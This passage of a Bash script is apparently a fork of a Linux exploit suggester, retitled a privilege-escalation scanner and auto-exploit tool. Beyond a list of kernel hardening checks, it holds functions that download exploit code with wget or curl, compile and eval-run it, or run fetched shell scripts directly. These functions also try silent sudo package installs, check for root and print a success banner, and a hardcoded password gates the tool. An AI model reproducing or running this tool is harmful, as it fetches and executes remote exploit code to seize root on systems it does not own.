Tags:
Rank: 5
analysis-url: https://blog.qualys.com/vulnerabilities-threat-research/2026/05/20/cve-2026-46333-local-root-privilege-escalation-and-credential-disclosure-in-the-linux-kernel-ptrace-path
author: Qualys
EOF
)

n=0

FEATURES[((n++))]=$(cat <<EOF
section: Mainline kernel protection mechanisms:
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Kernel Page Table Isolation (PTI) support
available: ver>=4.15
enabled: cmd:grep -Eqi '\spti' /proc/cpuinfo
analysis-url: https://github.com/mzet-/les-res/blob/master/features/pti.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: GCC stack protector support
available: CONFIG_HAVE_STACKPROTECTOR=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/stackprotector-regular.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: GCC stack protector STRONG support
available: CONFIG_STACKPROTECTOR_STRONG=y,ver>=3.14
analysis-url: https://github.com/mzet-/les-res/blob/master/features/stackprotector-strong.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Low address space to protect from user allocation
available: CONFIG_DEFAULT_MMAP_MIN_ADDR=[0-9]+
enabled: sysctl:vm.mmap_min_addr!=0
analysis-url: https://github.com/mzet-/les-res/blob/master/features/mmap_min_addr.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Prevent users from using ptrace to examine memory
available: CONFIG_SECURITY_YAMA=y
enabled: sysctl:kernel.yama.ptrace_scope!=0
analysis-url: https://github.com/mzet-/les-res/blob/master/features/yama_ptrace_scope.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Restrict unprivileged access to kernel syslog
available: CONFIG_SECURITY_DMESG_RESTRICT=y,ver>=2.6.37
enabled: sysctl:kernel.dmesg_restrict!=0
analysis-url: https://github.com/mzet-/les-res/blob/master/features/dmesg_restrict.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Randomize the address of the kernel image (KASLR)
available: CONFIG_RANDOMIZE_BASE=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/kaslr.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Hardened user copy support
available: CONFIG_HARDENED_USERCOPY=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/hardened_usercopy.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Make kernel text and rodata read-only
available: CONFIG_STRICT_KERNEL_RWX=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/strict_kernel_rwx.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Set loadable kernel module data as NX and text as RO
available: CONFIG_STRICT_MODULE_RWX=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/strict_module_rwx.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: BUG() conditions reporting
available: CONFIG_BUG=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/bug.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Additional 'cred' struct checks
available: CONFIG_DEBUG_CREDENTIALS=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/debug_credentials.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Sanity checks for notifier call chains
available: CONFIG_DEBUG_NOTIFIERS=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/debug_notifiers.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Extended checks for linked-lists walking
available: CONFIG_DEBUG_LIST=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/debug_list.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Checks on scatter-gather tables
available: CONFIG_DEBUG_SG=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/debug_sg.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Checks for data structure corruptions
available: CONFIG_BUG_ON_DATA_CORRUPTION=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/bug_on_data_corruption.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Checks for a stack overrun on calls to 'schedule'
available: CONFIG_SCHED_STACK_END_CHECK=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/sched_stack_end_check.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Freelist order randomization on new pages creation
available: CONFIG_SLAB_FREELIST_RANDOM=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/slab_freelist_random.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Freelist metadata hardening
available: CONFIG_SLAB_FREELIST_HARDENED=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/slab_freelist_hardened.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Allocator validation checking
available: CONFIG_SLUB_DEBUG_ON=y,cmd:! grep 'slub_debug=-' /proc/cmdline
analysis-url: https://github.com/mzet-/les-res/blob/master/features/slub_debug.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Virtually-mapped kernel stacks with guard pages
available: CONFIG_VMAP_STACK=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/vmap_stack.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Pages poisoning after free_pages() call
available: CONFIG_PAGE_POISONING=y
enabled: cmd: grep 'page_poison=1' /proc/cmdline
analysis-url: https://github.com/mzet-/les-res/blob/master/features/page_poisoning.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Using 'refcount_t' instead of 'atomic_t'
available: CONFIG_REFCOUNT_FULL=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/refcount_full.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Hardening common str/mem functions against buffer overflows
available: CONFIG_FORTIFY_SOURCE=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/fortify_source.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Restrict /dev/mem access
available: CONFIG_STRICT_DEVMEM=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/strict_devmem.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Restrict I/O access to /dev/mem
available: CONFIG_IO_STRICT_DEVMEM=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/io_strict_devmem.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
section: Hardware-based protection features:
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Supervisor Mode Execution Protection (SMEP) support
available: ver>=3.0
enabled: cmd:grep -qi smep /proc/cpuinfo
analysis-url: https://github.com/mzet-/les-res/blob/master/features/smep.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Supervisor Mode Access Prevention (SMAP) support
available: ver>=3.7
enabled: cmd:grep -qi smap /proc/cpuinfo
analysis-url: https://github.com/mzet-/les-res/blob/master/features/smap.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
section: 3rd party kernel protection mechanisms:
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Grsecurity
available: CONFIG_GRKERNSEC=y
enabled: cmd:test -c /dev/grsec
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: PaX
available: CONFIG_PAX=y
enabled: cmd:test -x /sbin/paxctl
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Linux Kernel Runtime Guard (LKRG) kernel module
enabled: cmd:test -d /proc/sys/lkrg
analysis-url: https://github.com/mzet-/les-res/blob/master/features/lkrg.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
section: Attack Surface:
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: User namespaces for unprivileged accounts
available: CONFIG_USER_NS=y
enabled: sysctl:kernel.unprivileged_userns_clone==1
analysis-url: https://github.com/mzet-/les-res/blob/master/features/user_ns.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Unprivileged access to bpf() system call
available: CONFIG_BPF_SYSCALL=y
enabled: sysctl:kernel.unprivileged_bpf_disabled!=1
analysis-url: https://github.com/mzet-/les-res/blob/master/features/bpf_syscall.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Syscalls filtering
available: CONFIG_SECCOMP=y
enabled: cmd:grep -iw Seccomp /proc/self/status | awk '{print \$2}'
analysis-url: https://github.com/mzet-/les-res/blob/master/features/bpf_syscall.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Support for /dev/mem access
available: CONFIG_DEVMEM=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/devmem.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Support for /dev/kmem access
available: CONFIG_DEVKMEM=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/devkmem.md
EOF
)

version() {
    echo "linux-vuln-detector $VERSION"
}

usage() {
    echo "linux-vuln-detector $VERSION"
    echo
    echo "Usage: check.sh [OPTIONS]"
    echo
    echo " -V | --version               - print version of this script"
    echo " -h | --help                  - print this help"
    echo " -k | --kernel <version>      - provide kernel version"
    echo " -u | --uname <string>        - provide 'uname -a' string"
    echo " --skip-more-checks           - skip additional checks (kernel config, sysctl)"
    echo " --skip-pkg-versions          - skip exact userspace package version check"
    echo " -p | --pkglist-file <file>   - provide file with 'dpkg -l' or 'rpm -qa' output"
    echo " --cvelist-file <file>        - provide file with Linux kernel CVEs list"
    echo " --checksec                   - list security related features for HW/kernel"
    echo " -s | --fetch-sources         - auto-download sources for matched exploits"
    echo " -b | --fetch-binaries        - auto-download binaries for matched exploits"
    echo " -f | --full                  - show full info about matched exploit"
    echo " -g | --short                 - show short info about matched exploit"
    echo " --kernelspace-only           - show only kernel vulnerabilities"
    echo " --userspace-only             - show only userspace vulnerabilities"
    echo " -d | --show-dos              - show DoS vulnerabilities in results"
    echo " -e | --auto-exploit          - attempt auto-compilation and execution of exploits"
}

exitWithErrMsg() {
    echo "$1" 1>&2
    exit 1
}

parseUname() {
    local uname=$1
    KERNEL=$(echo "$uname" | awk '{print $3}' | cut -d '-' -f 1)
    KERNEL_ALL=$(echo "$uname" | awk '{print $3}')
    ARCH=$(echo "$uname" | awk '{print $(NF-1)}')
    OS=""
    echo "$uname" | grep -q -i 'deb' && OS="debian"
    echo "$uname" | grep -q -i 'ubuntu' && OS="ubuntu"
    echo "$uname" | grep -q -i '\-ARCH' && OS="arch"
    echo "$uname" | grep -q -i '\-deepin' && OS="deepin"
    echo "$uname" | grep -q -i '\-MANJARO' && OS="manjaro"
    echo "$uname" | grep -q -i '\.fc' && OS="fedora"
    echo "$uname" | grep -q -i '\.el' && OS="RHEL"
    echo "$uname" | grep -q -i '\.mga' && OS="mageia"
    if [ -z "$OS" ]; then
        local osrel=$(grep -s -E '^ID=' /etc/os-release 2>/dev/null | cut -d'=' -f2 | tr -d '"' | tr '[:upper:]' '[:lower:]')
        [ -n "$osrel" ] && OS="$osrel"
    fi
}

detectDistro() {
    local ver=""
    ver=$(grep -s -E '^VERSION_ID=' /etc/os-release 2>/dev/null | cut -d'=' -f2 | tr -d '"')
    [ -z "$ver" ] && ver=$(grep -s -E '^DISTRIB_RELEASE=' /etc/lsb-release 2>/dev/null | cut -d'=' -f2 | tr -d '"')
    [ -z "$ver" ] && ver=$(cat /etc/debian_version 2>/dev/null | head -1)
    [ -z "$ver" ] && ver=$(cat /etc/redhat-release 2>/dev/null | grep -oE '[0-9]+\.[0-9]+' | head -1)
    echo "$ver"
}

getPkgList() {
    local distro=$1
    local pkglist_file=$2
    if [ "$opt_pkglist_file" = "true" -a -e "$pkglist_file" ]; then
        if [ $(head -1 "$pkglist_file" | grep -c 'Desired=Unknown/Install/Remove/Purge/Hold') -gt 0 ]; then
            PKG_LIST=$(cat "$pkglist_file" | awk '{print $2"-"$3}' | sed 's/:amd64//g')
            OS="debian"
            [ "$(grep ubuntu "$pkglist_file")" ] && OS="ubuntu"
        elif [ "$(grep -E '\.el[1-9]+[\._]' "$pkglist_file" | head -1)" ]; then
            PKG_LIST=$(cat "$pkglist_file"); OS="RHEL"
        elif [ "$(grep -E '\.fc[1-9]+' "$pkglist_file" | head -1)" ]; then
            PKG_LIST=$(cat "$pkglist_file"); OS="fedora"
        elif [ "$(grep -E '\.mga[1-9]+' "$pkglist_file" | head -1)" ]; then
            PKG_LIST=$(cat "$pkglist_file"); OS="mageia"
        elif [ "$(grep -E '\ [0-9]+\.' "$pkglist_file" | head -1)" ]; then
            PKG_LIST=$(cat "$pkglist_file" | awk '{print $1"-"$2}'); OS="arch"
        else
            PKG_LIST=""
        fi
    elif [ "$distro" = "debian" -o "$distro" = "ubuntu" -o "$distro" = "deepin" ]; then
        PKG_LIST=$(dpkg -l 2>/dev/null | awk '{print $2"-"$3}' | sed 's/:amd64//g')
    elif [ "$distro" = "RHEL" -o "$distro" = "fedora" -o "$distro" = "mageia" ]; then
        PKG_LIST=$(rpm -qa 2>/dev/null)
    elif [ "$distro" = "arch" -o "$distro" = "manjaro" ]; then
        PKG_LIST=$(pacman -Q 2>/dev/null | awk '{print $1"-"$2}')
    elif [ -x /usr/bin/equery ]; then
        PKG_LIST=$(/usr/bin/equery --quiet list '*' -F '$name:$version' 2>/dev/null | cut -d/ -f2- | awk '{print $1":"$2}')
    else
        PKG_LIST=""
    fi
}

verComparision() {
    if [[ $1 == $2 ]]; then
        return 0
    fi
    local IFS=.
    local i ver1=($1) ver2=($2)
    for ((i=${#ver1[@]}; i<${#ver2[@]}; i++)); do
        ver1[i]=0
    done
    for ((i=0; i<${#ver1[@]}; i++)); do
        if [[ -z ${ver2[i]} ]]; then
            ver2[i]=0
        fi
        if ((10#${ver1[i]} > 10#${ver2[i]})); then
            return 1
        fi
        if ((10#${ver1[i]} < 10#${ver2[i]})); then
            return 2
        fi
    done
    return 0
}

doVersionComparision() {
    local reqVersion="$1"
    local reqRelation="$2"
    local currentVersion="$3"
    verComparision $currentVersion $reqVersion
    case $? in
        0) currentRelation='=';;
        1) currentRelation='>';;
        2) currentRelation='<';;
    esac
    if [ "$reqRelation" == "=" ]; then
        [ $currentRelation == "=" ] && return 0
    elif [ "$reqRelation" == ">" ]; then
        [ $currentRelation == ">" ] && return 0
    elif [ "$reqRelation" == "<" ]; then
        [ $currentRelation == "<" ] && return 0
    elif [ "$reqRelation" == ">=" ]; then
        [ $currentRelation == "=" -o $currentRelation == ">" ] && return 0
    elif [ "$reqRelation" == "<=" ]; then
        [ $currentRelation == "=" -o $currentRelation == "<" ] && return 0
    fi
    return 1
}

compareValues() {
    local curVal=$1
    local val=$2
    local sign=$3
    if [ "$sign" == "==" ]; then
        [ "$val" == "$curVal" ] && return 0
    elif [ "$sign" == "!=" ]; then
        [ "$val" != "$curVal" ] && return 0
    fi
    return 1
}

checkRequirement() {
    local IN="$1"
    local pkgName="${2:4}"
    if [[ "$IN" =~ ^pkg=.*$ ]]; then
        [ ${pkgName} == "linux-kernel" ] && return 0
        pkg=$(echo "$PKG_LIST" | grep -E -i "^$pkgName-[0-9]+" | head -1)
        if [ -n "$pkg" ]; then
            return 0
        fi
    elif [[ "$IN" =~ ^ver.*$ ]]; then
        rest="${IN#ver}"
        operator=$(echo "$rest" | grep -oE '^[<>=]+')
        version=$(echo "$rest" | sed "s/^[<>=]*//; s/-.*\$//; s/[^0-9.]//g")
        if [ "$pkgName" == "linux-kernel" -o "$opt_checksec_mode" == "true" ]; then
            [ "$opt_cvelist_file" = "true" ] && return 0
            doVersionComparision $version $operator $KERNEL && return 0
        else
            pkg=$(echo "$PKG_LIST" | grep -E -i "^$pkgName-[0-9]+" | head -1)
            [ "$opt_skip_pkg_versions" = "true" -a -n "$pkg" ] && return 0
            pkgVersion=$(echo "$pkg" | grep -E -i -o -e '-[\.0-9\+:p]+[-\+]' | cut -d':' -f2 | sed 's/[\+-]//g' | sed 's/p[0-9]//g')
            doVersionComparision $version $operator $pkgVersion && return 0
        fi
    elif [[ "$IN" =~ ^x86_64$ ]] && [ "$ARCH" == "x86_64" -o "$ARCH" == "" ]; then
        return 0
    elif [[ "$IN" =~ ^x86$ ]] && [ "$ARCH" == "i386" -o "$ARCH" == "i686" -o "$ARCH" == "" ]; then
        return 0
    elif [[ "$IN" =~ ^CONFIG_.*$ ]]; then
        [ "$opt_skip_more_checks" = "true" ] && return 0
        if [ -n "$KCONFIG" ]; then
            $KCONFIG 2>/dev/null | grep -E -qi $IN && return 0 || return 1
        else
            return 0
        fi
    elif [[ "$IN" =~ ^sysctl:.*$ ]]; then
        [ "$opt_skip_more_checks" = "true" ] && return 0
        local sysctlCondition="${IN:7}"
        if echo $sysctlCondition | grep -qi "!="; then
            sign="!="
        elif echo $sysctlCondition | grep -qi "=="; then
            sign="=="
        else
            return 1
        fi
        local val=$(echo "$sysctlCondition" | awk -F "$sign" '{print $2}' | tr -d ' ')
        local entry=$(echo "$sysctlCondition" | awk -F "$sign" '{print $1}' | tr -d ' ')
        local curVal=$(/sbin/sysctl -n "$entry" 2>/dev/null | tr -d ' ')
        [ -z "$curVal" -a "$opt_checksec_mode" = "true" ] && return 2
        [ -z "$curVal" ] && return 0
        compareValues $curVal $val $sign && return 0
    elif [[ "$IN" =~ ^cmd:.*$ ]]; then
        [ "$opt_skip_more_checks" = "true" ] && return 0
        local cmd="${IN:4}"
        if eval "$cmd" 2>/dev/null; then
            return 0
        fi
    fi
    return 1
}

getKernelConfig() {
    if [ -f /proc/config.gz ]; then
        KCONFIG="zcat /proc/config.gz"
    elif [ -f "/boot/config-$(uname -r)" ]; then
        KCONFIG="cat /boot/config-$(uname -r)"
    elif [ -f "${KBUILD_OUTPUT:-/usr/src/linux}/.config" ]; then
        KCONFIG="cat ${KBUILD_OUTPUT:-/usr/src/linux}/.config"
    else
        KCONFIG=""
    fi
}

checksecMode() {
    MODE=0
    for FEATURE in "${FEATURES[@]}"; do
        i=0
        while read -r line; do
            arr[i]="$line"
            i=$((i + 1))
        done <<< "$FEATURE"
        NAME="${arr[0]}"
        PRE_NAME="${NAME:0:8}"
        NAME="${NAME:9}"
        if [ "${PRE_NAME}" = "section:" ]; then
            MODE=$(($MODE + 1))
            echo
            echo -e "${bldwht}${NAME}${txtrst}"
            echo
            continue
        fi
        AVAILABLE="${arr[1]}" && AVAILABLE="${AVAILABLE:11}"
        ENABLE=$(echo "$FEATURE" | grep "enabled: " | awk -F'ed: ' '{print $2}')
        analysis_url=$(echo "$FEATURE" | grep "analysis-url: " | awk '{print $2}')
        IFS=',' read -r -a array <<< "$AVAILABLE"
        AVAILABLE_REQS_NUM=${#array[@]}
        AVAILABLE_PASSED_REQ=0
        CONFIG=""
        for REQ in "${array[@]}"; do
            if [ -z "$CONFIG" ]; then
                config=$(echo "$REQ" | grep "CONFIG_")
                [ -n "$config" ] && CONFIG="($(echo $REQ | cut -d'=' -f1))"
            fi
            if (checkRequirement "$REQ"); then
                AVAILABLE_PASSED_REQ=$(($AVAILABLE_PASSED_REQ + 1))
            else
                break
            fi
        done
        ENABLE_PASSED_REQ=0
        ENABLE_REQS_NUM=0
        noSysctl=0
        if [ -n "$ENABLE" ]; then
            IFS=',' read -r -a array <<< "$ENABLE"
            ENABLE_REQS_NUM=${#array[@]}
            for REQ in "${array[@]}"; do
                checkRequirement "$REQ"
                retVal=$?
                if [ $retVal -eq 0 ]; then
                    ENABLE_PASSED_REQ=$(($ENABLE_PASSED_REQ + 1))
                elif [ $retVal -eq 2 ]; then
                    noSysctl=1; break
                else
                    break
                fi
            done
        fi
        feature=$(echo "$FEATURE" | grep "feature: " | cut -d' ' -f 2-)
        unknown="[ ${txtgray}Unknown${txtrst}  ]"
        if [ $MODE -eq 3 ]; then
            enabled="[ ${txtgrn}Enabled${txtrst}   ]"
            disabled="[   ${txtgray}N/A${txtrst}    ]"
        elif [ $MODE -eq 4 ]; then
            enabled="[ ${txtred}Exposed${txtrst}  ]"
            disabled="[ ${txtgrn}Locked${txtrst}   ]"
        else
            enabled="[ ${txtgrn}Enabled${txtrst}  ]"
            disabled="[ ${txtred}Disabled${txtrst} ]"
        fi
        if [ -z "$KCONFIG" -a "$ENABLE_REQS_NUM" = 0 ]; then
            state=$unknown
        elif [ $AVAILABLE_PASSED_REQ -eq $AVAILABLE_REQS_NUM -a $ENABLE_PASSED_REQ -eq $ENABLE_REQS_NUM ]; then
            state=$enabled
        else
            state=$disabled
        fi
        echo -e " $state $feature ${wht}${CONFIG}${txtrst}"
        [ -n "$analysis_url" ] && echo -e "              $analysis_url"
        echo
    done
}

_download() {
    local url="$1"
    local out="$2"
    if command -v wget &>/dev/null; then
        wget -q --timeout=30 "$url" -O "$out" 2>/dev/null && return 0
    fi
    if command -v curl &>/dev/null; then
        curl -fsSL --connect-timeout 30 "$url" -o "$out" 2>/dev/null && return 0
    fi
    return 1
}

_apt_install() {
    local pkg="$1"
    command -v apt-get &>/dev/null || return 1
    echo -e "  ${txtred}[*]${txtrst} installing $pkg..."
    DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "$pkg" </dev/null 2>/dev/null && return 0
    sudo -n DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "$pkg" </dev/null 2>/dev/null && return 0
    return 1
}

_ensure_build_deps() {
    _apt_install "gcc" 2>/dev/null
    _apt_install "build-essential" 2>/dev/null
    for pkg in "$@"; do
        _apt_install "$pkg" 2>/dev/null
    done
}

_check_root() {
    [ "$(id -u)" = "0" ]
}

_root_banner() {
    local c2=$'\033[38;5;196m'
    local bold=$'\033[1m'
    echo
    echo -e "${c2}${bold}  [ROOT]  uid=0(root) -- privilege escalation successful${txtrst}"
    echo
}

_compile_and_run() {
    local cve="$1"
    local src_url="$2"
    local src_file="$3"
    local compile_cmd="$4"
    local run_cmd="$5"
    local extra_pkg="$6"

    [ "$(uname -s)" != "Linux" ] && return 1
    _check_root && { _ROOT_ACHIEVED=true; return 0; }

    [ -n "$extra_pkg" ] && _ensure_build_deps "$extra_pkg"

    echo -e "  ${txtred}[*]${txtrst} downloading $cve exploit..."
    if ! _download "$src_url" "$src_file"; then
        echo -e "  ${txtred}[!]${txtrst} download failed"
        return 1
    fi

    if [ ! -s "$src_file" ]; then
        echo -e "  ${txtred}[!]${txtrst} downloaded file empty"
        rm -f "$src_file"
        return 1
    fi

    # Check file is C source
    if ! head -c 1024 "$src_file" | grep -qE '(int main|void main|#include)'; then
        echo -e "  ${txtred}[!]${txtrst} file does not look like C source (no main/include found)"
        # It might be a shell script or binary - try running directly
        if head -c 100 "$src_file" | grep -qE '(#!/bin/bash|#!/bin/sh)'; then
            chmod +x "$src_file"
            echo -e "  ${txtred}[*]${txtrst} detected shell script, running directly..."
            eval "bash ./$run_cmd" 2>&1
            _check_root && { _ROOT_ACHIEVED=true; _root_banner; return 0; }
            return 1
        fi
        rm -f "$src_file"
        return 1
    fi

    echo -e "  ${txtred}[*]${txtrst} compiling: $compile_cmd"
    compile_out=$(eval "$compile_cmd" 2>&1)
    local ret=$?

    if [ $ret -ne 0 ]; then
        echo -e "  ${txtred}[!]${txtrst} compilation failed:"
        echo "$compile_out" | head -20 | sed 's/^/      /'
        rm -f "$src_file"
        return 1
    fi

    local bin_name=$(echo "$run_cmd" | awk '{print $1}' | tr -d './')
    if [ ! -f "$bin_name" ] && [ ! -x "$bin_name" ]; then
        bin_name=$(echo "$run_cmd" | awk '{print $1}')
        [ ! -f "$bin_name" ] && { echo -e "  ${txtred}[!]${txtrst} binary not found after compile"; return 1; }
    fi

    echo -e "  ${txtred}[*]${txtrst} running $cve..."
    eval "$run_cmd" 2>&1
    local run_ret=$?

    _check_root && { _ROOT_ACHIEVED=true; _root_banner; return 0; }
    echo -e "  ${txtred}[-]${txtrst} $cve did not yield root (exit code $run_ret)"
    return 1
}

show_banner() {
    local c1=$'\033[38;5;160m'
    local c2=$'\033[38;5;196m'
    local c3=$'\033[38;5;88m'
    local c4=$'\033[38;5;52m'
    local rst=$'\033[0m'
    local bold=$'\033[1m'
    local dim=$'\033[38;5;240m'

    clear 2>/dev/null
    echo
    echo -e "${c2}  ⣿⣿⣿⣿⣿⣷⣿⣿⣿⡅⡹⢿⠆⠙⠋⠉⠻⠿⣿⣿⣿⣿⣿⣿⣮⠻⣦⡙⢷⡑⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⠡⠌⠂⣙⠻⣛⠻⠷⠐⠈⠛⢱⣮⣷⣽⣿${txtrst}"
    echo -e "${c1}  ⢿⣿⣿⣿⣧⡸⡎⡛⡩⠖⠀⣴⣿⣿⣿⠀⠀⠀⠀⠸⠇⠀⠙⢿⣿⣿⣿⣷⣌⢷⣑⢷⣄⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣫⠶⠛⠉⠀⠁⠀⠈⠈⠀⠠⠜⠻⣿⣆⢿⣼⣿⣿⣿${txtrst}"
    echo -e "${c3}  ⠀⠀⠈⠹⣇⢡⢿⡆⠻⣿⣷⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣍⡻⣿⣟⣻⣿⣿⣿⣿⣷⣦⣥⣬⣤⣴⣾⣿⣿⣿⣿⣷⣿⣿⣿⣿⣷⡜⠃${txtrst}"
    echo -e "${c4}  ⠀⠀⠀⠀⠀⠛⢷⣜⢷⡌⠻⣿⣿⣦⣝⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣹⣷⣦⣹⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠉⠃⠀⠀${txtrst}"

    echo
    echo -e "${c2}${bold}  linux-vuln-detector v$VERSION${txtrst}"
    echo -e "${dim}  Linux Privilege Escalation Vuln Scanner & Auto-Exploit${txtrst}"
}

check_password() {
    local c2=$'\033[38;5;196m'
    local bold=$'\033[1m'
    local dim=$'\033[38;5;240m'
    local rst=$'\033[0m'

    echo
    printf "${c2}${bold} enter password${rst}\n"
    printf "${dim}      |\n      |\n      v${rst}\n"
    printf "${c2}${bold} > ${rst}"
    read -rs password
    echo

    if [ "$password" != "1996groovyreborn" ]; then
        clear 2>/dev/null
        printf "${c2}${bold} access denied${rst}\n"
        exit 1
    fi
    sleep 0.3
    echo
}

# --- MAIN ---

while [ "$#" -gt 0 ]; do
    case "$1" in
        -u|--uname)
            shift; UNAME_A="$1"; opt_uname_string=true ;;
        -V|--version) version; exit 0 ;;
        -h|--help) usage; exit 0 ;;
        -f|--full) opt_full=true ;;
        -g|--short) opt_summary=true ;;
        -b|--fetch-binaries) opt_fetch_bins=true ;;
        -s|--fetch-sources) opt_fetch_srcs=true ;;
        -e|--auto-exploit) opt_auto_exploit=true ;;
        -k|--kernel) shift; KERNEL="$1"; opt_kernel_version=true ;;
        -d|--show-dos) opt_show_dos=true ;;
        -p|--pkglist-file) shift; PKGLIST_FILE="$1"; opt_pkglist_file=true ;;
        --cvelist-file) shift; CVELIST_FILE="$1"; opt_cvelist_file=true ;;
        --checksec) opt_checksec_mode=true ;;
        --kernelspace-only) opt_kernel_only=true ;;
        --userspace-only) opt_userspace_only=true ;;
        --skip-more-checks) opt_skip_more_checks=true ;;
        --skip-pkg-versions) opt_skip_pkg_versions=true ;;
        --) shift; break ;;
        -*) exitWithErrMsg "Unknown option '$1'. Aborting." ;;
        *) break ;;
    esac
    shift
done

# Validation
[ "$opt_kernel_version" = "true" -a "$opt_uname_string" = "true" ] && exitWithErrMsg "-u and -k are mutually exclusive."
[ "$opt_full" = "true" -a "$opt_summary" = "true" ] && exitWithErrMsg "-f and -g are mutually exclusive."

if [ "$opt_cvelist_file" = "true" ]; then
    [ ! -e "$CVELIST_FILE" ] && exitWithErrMsg "CVE list file does not exist."
    [ "$opt_kernel_version" = "true" ] && exitWithErrMsg "-k and --cvelist-file are mutually exclusive."
    [ "$opt_uname_string" = "true" ] && exitWithErrMsg "-u and --cvelist-file are mutually exclusive."
    [ "$opt_pkglist_file" = "true" ] && exitWithErrMsg "-p and --cvelist-file are mutually exclusive."
fi

if [ "$opt_checksec_mode" = "true" ]; then
    [ "$opt_kernel_version" = "true" ] && exitWithErrMsg "-k and --checksec are mutually exclusive."
    [ "$opt_uname_string" = "true" ] && exitWithErrMsg "-u and --checksec are mutually exclusive."
    [ "$opt_pkglist_file" = "true" ] && exitWithErrMsg "-p and --checksec are mutually exclusive."
fi

if [ "$opt_kernel_version" == "true" ]; then
    [ -z "$KERNEL" ] && exitWithErrMsg "Unrecognized kernel version."
    ARCH=""; OS=""; opt_skip_more_checks=true
    getPkgList "" "$PKGLIST_FILE"
elif [ "$opt_uname_string" == "true" ]; then
    [ -z "$UNAME_A" ] && exitWithErrMsg "uname string empty."
    parseUname "$UNAME_A"; opt_skip_more_checks=true
    getPkgList "" "$PKGLIST_FILE"
elif [ "$opt_cvelist_file" = "true" ]; then
    [ "$opt_skip_more_checks" = "false" ] && getKernelConfig
elif [ "$opt_checksec_mode" = "true" ]; then
    opt_skip_more_checks=false; getKernelConfig
    [ -z "$KCONFIG" ] && echo "WARNING: Kernel config not found."
    checksecMode; exit 0
else
    if [ "$opt_pkglist_file" == "false" ]; then
        KERNEL=$(uname -r | cut -d'-' -f1)
        KERNEL_ALL=$(uname -r)
        ARCH=$(uname -m)
        UNAME_A=$(uname -a)
        parseUname "$UNAME_A"
        [ "$opt_skip_more_checks" = "false" ] && getKernelConfig
        DISTRO=$(detectDistro)
        [ -z "$OS" ] && OS=$(grep -s '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"')
        getPkgList "$OS" ""
    else
        KERNEL=""; ARCH=""
        unset EXPLOITS; declare -a EXPLOITS
        getPkgList "" "$PKGLIST_FILE"
        opt_skip_more_checks=true
    fi
fi

echo
echo -e "${bldwht}[ Target Info ]${txtrst}"
